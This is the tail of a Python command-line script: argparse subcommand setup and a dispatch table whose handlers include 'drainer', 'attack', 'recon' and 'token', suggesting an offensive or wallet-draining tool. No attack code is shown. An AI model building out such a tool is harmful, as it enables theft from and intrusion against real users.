    br.add_argument('--chain', help='Chain to run')
    br.add_argument('--header', nargs='*', help='Custom headers')
    br.add_argument('--json', action='store_true', help='JSON output')

    # config
    cfg_p = subparsers.add_parser('config', help='Configuration')
    cfg_sp = cfg_p.add_subparsers(dest='config_subcommand')
    cs = cfg_sp.add_parser('set', help='Set config')
    cs.add_argument('config_key', help='Key')
    cs.add_argument('config_value', help='Value')
    cfg_sp.add_parser('show', help='Show config')

    args = parser.parse_args()

    if not args.command:
        parser.print_help()
        return

    commands = {
        'status': cmd_status,
        'flare': cmd_flare,
        'pipeline': cmd_pipeline,
        'token': cmd_token,
        'drainer': cmd_drainer,
        'attack': cmd_attack,
        'recon': cmd_recon,
        'report': cmd_report,
        'batch': cmd_batch,
        'config': cmd_config,
    }

    cmd_func = commands.get(args.command)
    if cmd_func:
        cmd_func(args)
    else:
        parser.print_help()


if __name__ == '__main__':
    main()
